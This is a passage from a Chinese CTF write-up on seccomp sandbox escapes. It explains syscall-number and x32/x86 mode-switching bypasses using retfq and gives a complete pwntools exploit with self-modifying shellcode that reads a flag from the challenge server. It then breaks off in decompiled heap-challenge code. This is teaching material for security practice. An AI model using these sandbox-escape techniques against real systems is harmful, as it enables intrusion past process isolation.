./shellcode</span></span><br><span class="line">---------- Shellcode ----------</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  <span class="keyword">if</span> (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  <span class="keyword">if</span> (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  <span class="keyword">if</span> (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  <span class="keyword">if</span> (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line">root@0df3326fd7c0:/ctf/work/download <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果按照我以往的思维方式会认为这道题目是没法完成的，应为没有open调用。所以下面就讲解一下sandbox的一些利用技巧。</p><h3 id="sandbox绕过"><a href="#sandbox绕过" class="headerlink" title="sandbox绕过"></a>sandbox绕过</h3><p>这里拿一个平时十分常见的沙箱规则做讲解：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这个沙箱规则是非常简单的，可以看到可以直接进行ORW获得flag。</p><p>可以看到这里前面两行做了一个判断，这个判断的效果就是判断当前的架构是否为<code>amd64</code>，如果不是可以看到直接会被kill掉。接着下面两行是验证<code>sys_number</code>的需要小于<code>0x40000000</code>。</p><p>下面主要讲解如果不存上述两条判断的情况，以及一种额外的绕过方式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>这里用题目的沙箱规则做讲解。可以看到这里不存在架构的判断，并且也不存在<code>sys_number</code>大小的判断。不过可以看出来这里不能使用<code>sysnumber+0x40000000</code>的方式来绕过，因为这里判断调用号都不满足时就会直接KILL掉。不过这里可以使用进入x86架构来绕过。</p><p>首先要知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的<code>retfq</code>汇编指令来修改。</p><p>然后再深扒一下<code>retfq</code>指令，这一指令其实存在的是两步，分别是:<code>ret; mov cs, [rsp + 8]</code>所以如果我们事先控制了栈上的内容即可实现切换架构。</p><p>再看一下没有<code>sys_number</code>检验的沙箱规则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这里是随便找的一个例子，可能不是很严谨。可以看到这里验证了架构，但是没有验证<code>sys_number</code>所以使用<code>sys_number|0x40000000</code>在下面的判断中不会被KILL掉，并且在后续执行过程中只会使用只会调用<code>sys_number</code></p><p>下面讲解一下如果上述两条都存在时我们需要调用ORW应该如何处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了<code>openat</code>，所以直接 调用<code>openat</code>，然后除了 read，write，其实还有两个<code>readv</code>，和<code>writev</code>，这些就能绕过限制读取flag</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>有了上述的基础就好做了，首先我们的思路就是想办法转到32位结构执行open，因为在32位的系统调用中open是5所以可以通过过滤。</p><p>不过这里我们需要知道的是在64位架构下的栈地址，在32位架构下是无法解析的，所以我还需要利用mmap生成一个可以放进esp中的地址当作栈。</p><p>其实有了上面的基础就很简单了，就不再赘述了直接给exp了。</p><h3 id="综上，exp-2"><a href="#综上，exp-2" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./shellcode&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x2e],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x2f],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x54],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*change to x86*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3d],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3d],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3e],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3e],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*0x4002DE\nb*0x4002EB\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx,eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"><span class="comment"># context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x29</span></span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*change to x64*/</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x40404089</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*write(1,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of Storm"></a>House of Storm</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题目是十分常规的菜单类堆题，不过这里在main中做了一定处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">new_environment</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  old_addr = &amp;dword_0;</span><br><span class="line">  read(a1, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  buf = buf &gt;&gt; <span class="number">32</span> &lt;&lt; <span class="number">12</span>;</span><br><span class="line">  mallopt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  change_addr(buf, <span class="number">0</span>, v1, v2, v3, v4);</span><br><span class="line">  munmap(old_addr, <span class="number">0x2000</span>uLL);</span><br><span class="line">  munmap((<span class="keyword">char</span> *)old_addr + <span class="number">2101248</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">  old_addr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">change_addr</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// ST28_8</span></span><br><span class="line">  __int64 v2; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = a1 - (_QWORD)old_addr;</span><br><span class="line">  mmap((<span class="keyword">void</span> *)a1, <span class="number">0x2000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)a1, old_addr, <span class="number">0x2000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)a1, <span class="number">0x2000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  mmap((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), <span class="number">0x1000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), (<span class="keyword">char</span> *)old_addr + <span class="number">2101248</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), <span class="number">0x1000</span>uLL, <span class="number">1</span>);</span><br><span class="line">  mmap((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), <span class="number">0x1000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), (<span class="keyword">char</span> *)&amp;_data_start + (_QWORD)old_addr, <span class="number">0x1000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">  retaddr += v2;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span 